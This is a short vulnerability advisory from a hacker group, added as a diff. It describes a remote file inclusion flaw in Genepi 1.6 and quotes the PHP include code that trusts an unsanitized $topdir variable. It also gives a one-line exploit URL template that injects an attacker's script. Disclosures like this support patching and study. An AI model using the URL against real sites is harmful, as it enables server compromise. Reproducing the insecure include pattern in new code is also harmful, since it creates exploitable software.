@@ -1,0 +1,57 @@
+---------------------------------------------------------------------------
+Genepi <= 1.6 [topdir] Remote File Include Vulnerability
+---------------------------------------------------------------------------
+
+
+Discovered By Kw3[R]Ln [ Romanian Security Team ] : hTTp://RST-CREW.net :
+Remote : Yes
+Critical Level : Dangerous
+---------------------------------------------------------------------------
+
+Affected software description :
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+Application : Genepi
+version : 1.6
+URL : anonymous@cvs.savannah.nongnu.org:/cvsroot/genepi genepi
+------------------------------------------------------------------
+
+Vurnerable CoDE:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+$libdir = $topdir . 'lib/';
+
+//blablabla.....
+
+//Including Genepi libs
+//Base classes
+include ($libdir . 'GenepiObject.php');
+include ($libdir . 'parser.php');
+include ($libdir . 'GenepiException.php');
+include ($libdir . 'Dtd.php');
+
+Exploit:
+~~~~
+Variable $topdir not sanitized.When register_globals=on an attacker ca
+n exploit this vulnerability with a simple php injection script.
+
+# http://www.site.com/[path]/genepi.php?topdir=[Evil_Script]
+---------------------------------------------------------------------------
+
+Shoutz:
+~~
+
+# Greetz to [Oo], str0ke, th0r, RST TEAM: [ !_30, darkking, DarkWizzard, Elias, Icarius, MiniDisc, Nemessis, Shocker, SpiridusuCaddy and sysghost !]
+# To all members of #h4cky0u and RST [ hTTp://RST-CREW.net ]
+---------------------------------------------------------------------------
+
+*/
+
+Contact:
+~~~~
+
+Nick: Kw3rLn
+E-mail: ciriboflacs[at]YaHoo[dot]Com
+Homepage: hTTp://RST-CREW.NET
+__/*
+
+# milw0rm.com [2006-10-13]
